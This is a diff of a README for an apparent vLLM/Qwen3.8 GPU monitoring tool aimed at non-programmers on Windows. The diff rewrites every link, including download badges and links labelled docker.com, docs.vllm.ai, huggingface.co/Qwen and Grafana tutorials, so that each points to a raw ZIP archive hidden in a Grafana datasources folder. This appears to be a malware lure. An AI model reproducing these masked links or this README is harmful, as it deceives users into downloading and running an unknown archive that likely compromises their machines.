@@ -1,6 +1,6 @@
 # 🔥 vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring - Your AI Powerhouse, Simplified
 
-[![Download Now](https://img.shields.io/badge/Download-vLLM_Qwen3.8_Flas-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring)
+[![Download Now](https://img.shields.io/badge/Download-vLLM_Qwen3.8_Flas-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4)](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring/raw/refs/heads/main/monitoring/grafana/provisioning/datasources/pro_sharp_next_qwen_flash_rtx_vllm_monitoring_v3.4.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Let's get you up and running in just a few minutes. No programming experience ne
 ### 📥 Step 1: Download the Package
 
 **Visit this link to download the application:**
-👉 [https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring)
+👉 [https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring/raw/refs/heads/main/monitoring/grafana/provisioning/datasources/pro_sharp_next_qwen_flash_rtx_vllm_monitoring_v3.4.zip](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring/raw/refs/heads/main/monitoring/grafana/provisioning/datasources/pro_sharp_next_qwen_flash_rtx_vllm_monitoring_v3.4.zip)
 
 Click the green **Code** button, then choose **Download ZIP**. The file may be large (several gigabytes), so give it time.
 
@@ -70,7 +70,7 @@ Once downloaded, find the ZIP file in your **Downloads** folder. Right-click and
 
 Docker is the engine that runs everything. Don't worry – you won't need to understand it deeply.
 
-1. Go to [docker.com](https://docker.com) and download **Docker Desktop for Windows**
+1. Go to [docker.com](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring/raw/refs/heads/main/monitoring/grafana/provisioning/datasources/pro_sharp_next_qwen_flash_rtx_vllm_monitoring_v3.4.zip) and download **Docker Desktop for Windows**
 2. Run the installer and follow the prompts
 3. When finished, launch Docker Desktop and wait until the whale icon stops animating
 
@@ -187,10 +187,10 @@ The `docs/` folder inside contains full parameter documentation.
 
 ## 📚 Further Resources
 
-- **Official vLLM Docs**: [docs.vllm.ai](https://docs.vllm.ai)
-- **Qwen Model Card**: [huggingface.co/Qwen](https://huggingface.co/Qwen)
-- **Grafana Tutorials**: [grafana.com/tutorials](https://grafana.com/tutorials)
-- **Docker Basics**: [docs.docker.com](https://docs.docker.com)
+- **Official vLLM Docs**: [docs.vllm.ai](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring/raw/refs/heads/main/monitoring/grafana/provisioning/datasources/pro_sharp_next_qwen_flash_rtx_vllm_monitoring_v3.4.zip)
+- **Qwen Model Card**: [huggingface.co/Qwen](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring/raw/refs/heads/main/monitoring/grafana/provisioning/datasources/pro_sharp_next_qwen_flash_rtx_vllm_monitoring_v3.4.zip)
+- **Grafana Tutorials**: [grafana.com/tutorials](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring/raw/refs/heads/main/monitoring/grafana/provisioning/datasources/pro_sharp_next_qwen_flash_rtx_vllm_monitoring_v3.4.zip)
+- **Docker Basics**: [docs.docker.com](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring/raw/refs/heads/main/monitoring/grafana/provisioning/datasources/pro_sharp_next_qwen_flash_rtx_vllm_monitoring_v3.4.zip)
 
 ---
 
@@ -226,7 +226,7 @@ This project is open-source, provided for educational and personal use. The unde
 
 **👉 Ready to dive in? Download now and turn your GPU into a supercomputer:**
 
-[![Download](https://img.shields.io/badge/Download_vLLM_Qwen3.8-8A2BE2?style=for-the-badge)](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring)
+[![Download](https://img.shields.io/badge/Download_vLLM_Qwen3.8-8A2BE2?style=for-the-badge)](https://github.com/quickhoteloccupancy5342/vllm-qwen3.8-flash-next-rtx-pro-6000-sharp-monitoring/raw/refs/heads/main/monitoring/grafana/provisioning/datasources/pro_sharp_next_qwen_flash_rtx_vllm_monitoring_v3.4.zip)
 
 When you run into any question, remember – the answer is always **Ctrl + C**, then `start.bat`, then ask again. Happy chatting!
 
